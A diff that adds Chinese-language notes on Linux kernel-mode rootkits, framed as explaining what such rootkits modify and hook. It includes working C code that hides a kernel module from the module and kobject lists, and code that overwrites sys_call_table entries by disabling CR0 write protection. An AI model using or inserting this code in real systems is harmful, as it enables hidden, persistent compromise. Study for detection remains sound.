@@ -260,3 +260,70 @@ func getPsProcesses(minAge time.Duration) (*ProcessMap, error) {
 
 
 Linux 内核态 rootkit 通过编写自定义的内核模块并将其加载到运行中的内核中，rootkit 可以获得更高的权限和更大的灵活性 。这类 rootkit 通常比用户态的更难检测和移除，因为它们在系统层次上运作，能够绕过大多数用户空间的安全机制。内核态 rootkit主要是修改内核的数据结构或者进行系统函数HOOK来实现隐藏和操控系统的行为, 那么我们就聚焦关注两个点：修改哪些数据结构， 怎么HOOK与HOOK哪些函数。
+
+
+隐藏模块。具体功能如下：
+
+- 记录当前模块的链表前驱节点。
+- 从模块链表中删除当前模块。
+- 记录当前模块的kobject链表前驱节点。
+- 删除模块的kobject。
+- 从kobject链表中删除当前模块。
+
+ 
+```bash
+
+
+static struct list_head *module_previous;
+static struct list_head *module_kobj_previous;
+static char module_hidden = 0;
+
+
+void module_hide(void)
+{
+	if (module_hidden) return;
+	module_previous = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	list_del(&THIS_MODULE->mkobj.kobj.entry);
+	module_hidden = !module_hidden;
+}
+
+```
+
+
+这段代码的功能是将系统调用表中的某个系统调用替换为自定义的函数:
+
+- 读取并保存当前CR0寄存器值。
+- 将原系统调用保存到orig_fn。
+- 修改CR0寄存器以允许写入系统调用表。
+- 替换系统调用表中的指定系统调用为新函数。
+- 恢复CR0寄存器值。
+
+
+
+```bash
+static inline void write_cr0_forced(unsigned long val) {
+    unsigned long __force_order;
+    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
+}
+
+void hook_sys_call_table(long int sysno, t_syscall hook_fn,
+                         t_syscall *orig_fn) {
+    unsigned long cr0;
+    pr_info(LOG_PREFIX "hook syscall number %ld", sysno);
+    if (!sys_call_table_ref) {
+        pr_warn(LOG_PREFIX
+                "address of sys_call_table was not found, skip hook\n");
+        return;
+    }
+    cr0 = read_cr0();
+    *orig_fn = sys_call_table_ref[sysno];
+    write_cr0_forced(cr0 & ~0x00010000);
+    sys_call_table_ref[sysno] = hook_fn;
+    write_cr0_forced(cr0);
+}
+
+```
+
